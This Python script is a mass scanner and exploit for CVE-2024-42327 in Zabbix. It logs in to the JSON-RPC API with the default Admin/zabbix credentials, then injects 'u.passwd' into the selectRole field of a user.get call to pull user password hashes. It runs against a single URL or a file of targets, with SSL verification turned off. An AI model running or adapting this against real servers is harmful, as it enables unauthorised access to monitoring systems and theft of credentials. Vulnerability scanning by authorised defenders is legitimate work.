import json
import requests
import urllib3
from urllib.parse import urljoin
import argparse
import ssl
import re
 
# 忽略 SSL 证书警告
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()
 
def check_rce_injection(url):
    protocols = ['http://', 'https://']
    found_vulnerabilities = False
 
    for protocol in protocols:
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        print(f"Checking {target_url}...")
        
        target_url.rstrip("/")
        target_endpoint1 = urljoin(target_url, "/api_jsonrpc.php")
 
        headers1 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Content-Type":"application/json-rpc"
        }
        payloads = "{\"jsonrpc\": \"2.0\", \"method\": \"user.login\", \"params\": {\"username\": \"Admin\", \"password\": \"zabbix\"}, \"id\": 1}"
        try:
            
            response = requests.post(target_endpoint1, verify=False, headers=headers1, timeout=10,data=payloads)
 
            if response.status_code == 200 and all(key in response.text for key in['jsonrpc','result']):
               
               result_auth_data = json.loads(response.text)
               result_value = result_auth_data['result']
               print(f"提取到的 auth: {result_value}" if result_value else '未找到 auth')
               
               payloads_modify = f'{{"jsonrpc": "2.0", "method": "user.get", "params": {{ "selectRole": ["roleid, u.passwd", "roleid"], "userids": "1" }}, "auth": "{result_value}", "id": 1}}'
 
               response2 = requests.post(target_endpoint1, verify=False, headers=headers1, timeout=10, data=payloads_modify)
               if response2.status_code == 200 and all(key in response2.text for key in['jsonrpc','surname','passwd','attempt_ip','result']):
                    print(f"\033[31mFind: {target_url}:Zabbix_CVE-2024-42327_SQLInjection!\033[0m")
                    found_vulnerabilities = True
 
        except requests.RequestException as e:
            print(f"Error checking {target_url}: {e}")
 
    return found_vulnerabilities
 
def main():
    parser = argparse.ArgumentParser(description="Check for RCE vulnerabilities.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL")
    group.add_argument("-f", "--file", help="File containing URLs")
 
    args = parser.parse_args()
 
    if args.url:
        check_rce_injection(args.url)
    elif args.file:
        urls = read_file(args.file)
        for url in urls:
            check_rce_injection(url)
 
if __name__ == "__main__":
    main()
